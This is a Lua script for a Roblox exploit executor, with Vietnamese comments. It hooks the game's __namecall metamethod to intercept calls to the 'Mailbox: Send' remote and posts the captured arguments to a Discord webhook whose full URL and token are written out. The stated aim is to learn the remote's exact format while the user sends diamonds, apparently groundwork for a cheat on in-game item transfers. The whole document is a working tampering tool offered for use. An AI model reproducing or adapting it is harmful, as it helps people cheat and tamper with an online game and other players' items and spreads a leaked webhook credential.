-- Spy Mailbox: Send InvokeServer format
local W="https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) end

d("🔍 **MAILBOX SPY** | `"..plr.Name.."`\n\nHãy **gửi 1 mailbox trong game** (thêm diamond vào rồi nhấn Gửi)\nScript sẽ in ra chính xác format", 0xffaa00)

local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    -- Bắt cả FireServer lẫn InvokeServer
    if (method=="FireServer" or method=="InvokeServer") and tostring(self.Name)=="Mailbox: Send" then
        local args={...}
        local lines={"Method: **"..method.."**", "Args: "..#args}
        for i,v in ipairs(args) do
            if type(v)=="table" then
                local sub={}
                for k,val in pairs(v) do
                    table.insert(sub, "  ["..tostring(k).."] = ("..type(val)..") "..tostring(val):sub(1,40))
                    if #sub>=15 then table.insert(sub,"  ..."); break end
                end
                table.insert(lines, "arg"..i.." = {")
                for _,s in ipairs(sub) do table.insert(lines,s) end
                table.insert(lines, "}")
            else
                table.insert(lines, "arg"..i.." = ("..type(v)..") "..tostring(v):sub(1,60))
            end
        end
        d("📬 **CAPTURED!**\n```\n"..table.concat(lines,"\n").."\n```", 0x00ff88)
    end
    return old(self,...)
end)
setreadonly(mt, true)

d("✅ Hook active! Giờ mở Hộp thư → gửi mailbox với 💎 bằng tay", 0x00ff00)

-- Giữ script sống 5 phút
wait(300)
setreadonly(mt, false)
mt.__namecall = old
setreadonly(mt, true)
